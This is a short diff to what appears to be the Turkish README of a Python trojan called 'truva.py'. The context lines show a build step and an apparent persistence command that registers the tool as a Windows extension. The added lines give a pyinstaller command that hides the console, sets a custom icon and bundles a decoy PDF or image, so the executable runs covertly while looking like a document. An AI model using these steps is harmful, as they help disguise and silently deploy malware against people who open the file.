@@ -43,4 +43,9 @@ pip instal pyinstaller
 pyinstaller truva.py --onefile  -> exe dosyasına çevirir. --onefile bütün importları tek sayfada birleştirir.
 kullanım:
 yerles windowseklenti(isimver gpeditde gözükecek)
+gizli çalışma:
+pyinstaller truva.py --onefile --noconsole --icon icon_uzantı --add-data "pdf/resim_yolu=>\Dektop\5.pdf;."
+veya resim ve icon eklemek için normal truva araçları ile yapılabilir.
+eklenecekler:
+menü kısmı -> komutların kullanımı.
 
